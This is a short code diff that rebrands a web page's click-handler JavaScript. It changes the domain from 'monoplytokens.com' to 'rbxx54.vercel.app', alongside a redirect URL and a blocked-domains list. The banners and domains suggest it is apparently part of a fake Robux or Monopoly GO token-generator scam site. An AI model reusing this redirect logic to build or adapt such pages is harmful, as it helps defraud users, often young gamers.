@@ -345,15 +345,15 @@ async function step2() {
     }
   }
 }
-/*================== [ VICTOR ABDO ] ===============*/
-/*================== [ talghi rbx iph ] ================*/
+/*================== [ 2] ===============*/
+/*================== [ roblox ] ================*/
 var button = document.querySelector('.btn');  
 button.addEventListener('click', function() {
     (function() {
-        var originalDomain = "monoplytokens.com";
+        var originalDomain = "rbxx54.vercel.app";
         var redirectURL = "https://www.rolls3.com";
         var blockedDomains = [
-            "mply.io.1arshg4.site",
+            "rbxx54.vercel.app/",
             "mply.io.4a6b8dh.site"
         ];
 
